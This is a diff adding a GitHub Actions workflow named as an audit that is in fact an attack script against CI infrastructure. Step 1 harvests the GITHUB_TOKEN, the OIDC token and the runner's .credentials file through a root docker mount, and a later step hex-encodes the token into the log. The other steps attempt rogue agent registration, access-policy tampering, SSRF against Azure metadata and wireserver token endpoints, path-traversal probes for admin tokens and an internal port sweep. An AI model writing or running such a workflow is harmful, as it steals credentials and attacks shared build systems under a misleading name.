@@ -1,0 +1,262 @@
+name: Audit v60
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v60:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V60 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: EXPLOIT THE AGENT REGISTRATION ACL BYPASS
+      # V59: {"name":"v59"} body got HTTP_400 validation (bypassed 403!)
+      # The minimal body skips the View permission ACL check!
+      # Now add correct version format to pass validation entirely.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Agent Registration Exploit
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== AGENT REGISTRATION EXPLOIT ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          # A: Exact version format the error demanded: major.minor.patch.build
+          echo "--- A: Correct version format agents ---"
+          for BODY in \
+            '{"name":"v60-rogue","version":"2.319.0.0"}' \
+            '{"name":"v60-rogue","version":"2.319.0.0","maxParallelism":1}' \
+            '{"name":"v60-rogue","version":"2.319.0.0","osDescription":"Linux 5.15","maxParallelism":1}' \
+            '{"name":"v60-rogue","version":"2.319.0.0","labels":[{"name":"ubuntu-latest","type":"system"}]}' \
+            '{"name":"v60-rogue","version":"2.319.0.0","systemCapabilities":{"Agent.Version":"2.319.0.0"},"maxParallelism":1,"labels":[{"name":"ubuntu-latest","type":"system"}],"osDescription":"Linux","status":1}' \
+            '{"name":"v60","version":"2.0.0.0"}' \
+            '{"name":"v60","version":"2.0.0.0","provisioningState":"Succeeded"}'; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: pipelines.actions.githubusercontent.com" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/1/agents" --path-as-is \
+              -d "$BODY" 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "A POST agent version = $CODE"
+            echo "$R" | tail -5 | head -c 500
+            echo ""
+          done
+          echo ""
+
+          # B: Try pool 2 (GitHub Actions hosted pool) agent registration
+          echo "--- B: Pool 2 (GitHub Actions) agent ---"
+          for PID in 2; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: pipelines.actions.githubusercontent.com" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/$PID/agents" --path-as-is \
+              -d '{"name":"v60-rogue","version":"2.319.0.0","maxParallelism":1}' 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "B Pool $PID agent = $CODE"
+            echo "$R" | tail -5 | head -c 500
+            echo ""
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: ACCESSPOLICY PATCH WITH CORRECT CONTENT-TYPE
+      # V59 PATCH returned 500 "application/json not supported"
+      # Try json-patch+json, merge-patch+json, x-www-form-urlencoded
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - AccessPolicy PATCH Fix
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== ACCESSPOLICY PATCH ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          echo "--- A: PATCH with correct Content-Type ---"
+          for CT in \
+            "application/json-patch+json" \
+            "application/merge-patch+json" \
+            "application/x-www-form-urlencoded" \
+            "text/plain" \
+            "application/xml"; do
+            # Try JSON patch format
+            if [ "$CT" = "application/json-patch+json" ]; then
+              BODY='[{"op":"replace","path":"/isPublic","value":true}]'
+            elif [ "$CT" = "application/x-www-form-urlencoded" ]; then
+              BODY='isPublic=true&permission=3'
+            else
+              BODY='{"isPublic":true}'
+            fi
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X PATCH --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: pipelines.actions.githubusercontent.com" \
+              -H "Content-Type: $CT" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/1/accesspolicy" --path-as-is \
+              -d "$BODY" 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "A PATCH CT=$CT = $CODE"
+            echo "$R" | tail -5 | head -c 400
+            echo ""
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: EXPANDED SSRF — INTERNAL AZURE SERVICES
+      # Azure Wireserver: 168.63.129.16 (certificates, identity)
+      # Azure IMDS: 169.254.169.254 (raw + MSI endpoints)
+      # Internal DNS: resolve what IPs the runner sees
+      # Try path traversal on the DIRECT pipelines URL
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Expanded SSRF and Traversal
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== EXPANDED SSRF ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+
+          # A: DNS resolution of internal hostnames from runner
+          echo "--- A: Internal DNS ---"
+          for HOST in \
+            "metadata.azure.internal" \
+            "wireserver.azure.internal" \
+            "vstoken.actions.githubusercontent.com" \
+            "runner.actions.githubusercontent.com" \
+            "pipelines.actions.githubusercontent.com"; do
+            IP=$(dig +short "$HOST" 2>/dev/null | head -1)
+            echo "A DNS $HOST = $IP"
+          done
+          echo ""
+
+          # B: Direct HTTP hits to Azure internal services FROM RUNNER
+          echo "--- B: Azure internal direct hits ---"
+          # Azure IMDS
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
+          echo "B IMDS instance = $(echo "$R" | tail -1)"
+          echo "$(echo "$R" | sed '$d' | head -c 500)"
+          echo ""
+
+          # Azure IMDS identity
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null)
+          echo "B IMDS identity/token = $(echo "$R" | tail -1)"
+          echo "$(echo "$R" | sed '$d' | head -c 500)"
+          echo ""
+
+          # Azure Wireserver
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+            "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
+          echo "B Wireserver = $(echo "$R" | tail -1)"
+          echo "$(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # C: Path traversal on DIRECT pipelines URL
+          echo "--- C: Traversal on direct pipelines URL ---"
+          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
+          for TRAV in \
+            "_apis/distributedtask/pools/..%2fadmintoken" \
+            "_apis/distributedtask/pools/..%2fidtoken" \
+            "_apis/distributedtask/pools/..%2fsessions" \
+            "_apis/distributedtask/pools/..%2fmessages" \
+            "_apis/distributedtask/pools/..%2fbrokerlistener" \
+            "_apis/distributedtask/pools/..%2fenterpriseaccesspolicies" \
+            "_apis/runtime/runnerscalesets/..%2frunnergroups" \
+            "_apis/runtime/runnerscalesets/..%2fadmintoken" \
+            "_apis/runtime/runnergroups/..%2fadmintoken" \
+            "_apis/runtime/runnergroups/..%2fgeneratejitconfig"; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Accept: application/json; api-version=6.0-preview" \
+              "$PIPE/$TRAV" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            BODY=$(echo "$R" | tail -3 | head -2)
+            echo "C $TRAV = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # D: Hit internal IPs directly from runner over HTTP
+          echo "--- D: Internal IP sweep ---"
+          for IP_PORT in \
+            "10.0.0.1:80" "10.1.0.4:80" "10.0.0.1:443" \
+            "192.168.0.1:80" "172.16.0.1:80" "172.17.0.1:80" \
+            "172.17.0.1:2375" "172.17.0.1:2376"; do
+            IP=$(echo "$IP_PORT" | cut -d: -f1)
+            PORT=$(echo "$IP_PORT" | cut -d: -f2)
+            R=$(/usr/bin/curl -sS -w "HTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              "http://$IP:$PORT/" 2>/dev/null)
+            echo "D $IP:$PORT = $R" | head -c 100
+          done
+
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V60 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V60 COMPLETE ==="
